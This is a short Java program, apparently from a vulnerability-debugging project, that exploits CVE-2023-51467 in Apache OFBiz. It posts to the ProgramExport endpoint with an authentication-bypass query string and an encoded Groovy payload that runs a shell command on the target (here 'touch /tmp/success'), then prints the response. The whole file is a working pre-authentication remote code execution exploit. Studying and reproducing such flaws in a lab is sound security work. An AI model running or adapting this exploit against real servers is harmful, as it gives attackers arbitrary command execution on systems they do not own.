package ofbiz.cve;

import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import com.pacemrc.vuldebug.common.utils.http.Response;
import org.apache.http.client.methods.HttpPost;

import java.io.IOException;
import java.net.URLEncoder;

public class CVE_2023_51467 {

    public static void main(String[] args) throws IOException {

        String url = "http://10.58.120.200:8080/webtools/control/ProgramExport;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y";
        String cmd = "touch /tmp/success";
        String body = "groovyProgram=import+groovy.lang.GroovyShell%3B%0A%0AString+expression+%3D+%22'"+ cmd +"'.execute()%22%3B%0AGroovyShell+gs+%3D+new+GroovyShell()%3B%0Ags.evaluate(expression)%3B";

        HttpRequest httpRequest = new HttpRequest("127.0.0.1", 8080);
        HttpPost httpPost = new HttpPost(url);
        httpPost.addHeader("Content-Type", "application/x-www-form-urlencoded");
        Response response = httpRequest.sendStringPost(httpPost,body);
        System.out.println(response.getStatusCode());
        System.out.println(response.getResponseBody());

    }
}
